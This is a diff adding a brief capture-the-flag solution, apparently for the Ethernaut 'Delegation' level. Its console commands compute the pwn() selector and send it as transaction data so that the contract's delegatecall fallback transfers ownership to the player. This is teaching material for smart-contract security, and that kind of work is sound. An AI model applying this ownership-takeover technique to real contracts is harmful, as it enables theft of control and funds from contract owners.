@@ -1,0 +1,7 @@
+- Create new Instance and run console commands
+- Check what contract you own using contract.abi (its Delegation not Delegate)
+await contract.owner()  # Deployer
+var pwnFuncSign = web3.utils.sha3("pwn()")
+pwnFuncSign  # equals to "0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab"
+await contract.sendTransaction({data: pwnFuncSign})
+await contract.owner()  # should be player now
